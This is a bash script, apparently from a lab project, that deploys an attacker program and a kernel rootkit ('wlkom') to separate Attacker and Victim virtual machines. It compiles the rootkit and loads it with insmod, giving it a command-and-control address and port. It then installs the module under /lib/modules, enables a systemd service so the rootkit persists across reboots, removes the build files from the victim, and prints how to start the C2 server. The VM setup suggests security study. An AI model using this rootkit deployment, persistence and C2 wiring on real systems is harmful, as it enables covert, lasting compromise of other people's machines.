#!/bin/bash
# Deploy the attacking program and rootkit to their respective VMs.
# Requires both VMs to be running and reachable via SSH.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
source "$ROOT_DIR/.env"
source "$ROOT_DIR/scripts/utils.sh"

VM_DIR="$ROOT_DIR/vms"

check_paths() {
    log_step "Checking project paths"
    [ ! -d "$ROOT_DIR/attacking_program" ] && log_error "attacking_program not found"
    [ ! -d "$ROOT_DIR/rootkit" ]           && log_error "rootkit not found"
    log_ok "Project directories found"
}

deploy_attacking_program() {
    log_step "Deploying attacking_program to Attacker VM"
    ssh_attacker "rm -rf ~/attacking_program" 2>/dev/null || true
    scp_to_attacker -r "$ROOT_DIR/attacking_program" "$VM_USER@localhost:~/"
    ssh_attacker "cd ~/attacking_program && make clean && make"
    log_ok "attacking_program compiled"
}

deploy_rootkit() {
    log_step "Deploying rootkit to Victim VM"
    ssh_victim "rm -rf ~/rootkit" 2>/dev/null || true
    scp_to_victim -r "$ROOT_DIR/rootkit" "$VM_USER@localhost:~/"

    # cloud-init already installs linux-headers-amd64, but the exact running
    # kernel version may differ — install the matching headers just in case
    log_info "Ensuring kernel headers match running kernel..."
    ssh_victim "sudo apt-get install -y -q linux-headers-\$(uname -r) 2>&1 | tail -2" || true

    log_info "Compiling rootkit..."
    ssh_victim "cd ~/rootkit && make clean && make"
    log_ok "Rootkit compiled"
}

load_rootkit() {
    log_step "Loading rootkit on Victim VM"
    ssh_victim "cd ~/rootkit && sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$CONTROL_PORT"
    log_ok "Rootkit loaded"
}

setup_persistence() {
    log_step "Setting up persistence on Victim VM"

    local KVER
    local SERVICE_FILE
    KVER=$(ssh_victim "uname -r")
    SERVICE_FILE="$(mktemp /tmp/wlkom.service.XXXXXX)"

    sed \
        -e "s/__KVER__/$KVER/g" \
        -e "s/__ATTACKER_IP__/$ATTACKER_IP/g" \
        -e "s/__CONTROL_PORT__/$CONTROL_PORT/g" \
        "$ROOT_DIR/scripts/templates/wlkom.service" > "$SERVICE_FILE"

    scp_to_victim "$SERVICE_FILE" "$VM_USER@localhost:/tmp/wlkom.service"
    rm -f "$SERVICE_FILE"

    ssh_victim "bash -s" << 'REMOTE'
set -e
KO_DIR="/lib/modules/$(uname -r)/kernel/wlkom"
sudo mkdir -p "$KO_DIR"
sudo cp ~/rootkit/wlkom.ko "$KO_DIR/wlkom.ko"
sudo depmod -a
sudo mv /tmp/wlkom.service /etc/systemd/system/wlkom.service
sudo systemctl daemon-reload
sudo systemctl enable wlkom.service
REMOTE

    log_ok "Persistence configured (wlkom.service enabled)"
}

cleanup() {
    log_step "Cleaning build artifacts from Victim VM"
    ssh_victim "rm -rf ~/rootkit"
    log_ok "Cleaned"
}

print_next_steps() {
    log_step "Deployment complete"
    echo ""
    echo "  Attacker VM — start the C2 server:"
    echo "    ssh $VM_USER@localhost -p $ATTACKER_SSH_PORT"
    echo "    cd ~/attacking_program && ./wlkom_c2 $CONTROL_PORT"
    echo ""
    echo "  The rootkit will connect automatically (retries every 5s)."
    echo ""
    echo "  Victim VM access:"
    echo "    ssh $VM_USER@localhost -p $VICTIM_SSH_PORT"
    echo ""
}

main() {
    check_paths
    wait_ssh "$ATTACKER_SSH_PORT" "Attacker"
    wait_ssh "$VICTIM_SSH_PORT" "Victim"
    deploy_attacking_program
    deploy_rootkit
    load_rootkit
    setup_persistence
    cleanup
    print_next_steps
}

main
